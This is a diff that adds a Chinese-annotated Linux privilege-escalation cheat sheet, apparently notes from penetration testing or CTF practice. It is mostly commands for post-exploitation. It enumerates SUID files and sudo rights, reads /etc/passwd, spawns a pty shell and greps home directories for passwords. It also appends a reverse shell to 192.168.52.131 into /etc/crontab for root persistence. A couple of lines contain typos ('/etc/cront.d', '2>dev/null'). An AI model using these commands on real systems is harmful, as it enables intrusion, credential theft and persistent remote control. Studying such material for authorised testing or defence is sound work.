@@ -1,0 +1,34 @@
+获取当前用户信息
+whoami
+系统版本
+uname -a 
+lsb_release -a
+查看用户权限
+sudo -l 
+配置的安装包
+dpkg -l
+设置环境变量可以提高一部分权限
+export TERM=xterm-color
+查看当前用户有哪些特殊权限
+*find / -perm -u=s -type f 2>/dev/null
+查看当前用户可以操作哪些文件
+find / -group users -type f 2>/dev/null
+查看当前用户有哪些写权限
+find / -writable -type f -not -path "/proc/*" -not -path "/sys/*" 2>/dev/null
+获取所有用户以及信息(寻找有/bin/bash 的用户)
+cat /etc/passwd
+将shell转化成正常交互界面
+python -c 'import pty;pty.spawn("/bin/bash")'
+*寻找自动执行文件
+cat /etc/crontab
+cat /etc/cront.d
+find / -name cronlog 2>dev/null
+找到后添加提权命令
+echo "/bin/bash -i >& /dev/tcp/192.168.52.131/1234 0>&1" >> 需要追加的文件路径（一般在etc/crontab)
+搜索所有用户的历史记录(搜索有关登录凭据)
+grep -R -i pass /home/* 2>/dev/null
+查看特殊权限 
+/sbin/getcap -r / 2>/dev/null
+su -切换root用户
+
+如果是ALL:(ALL:ALL)使用 sudo /bin/bash 即可切换到root用户
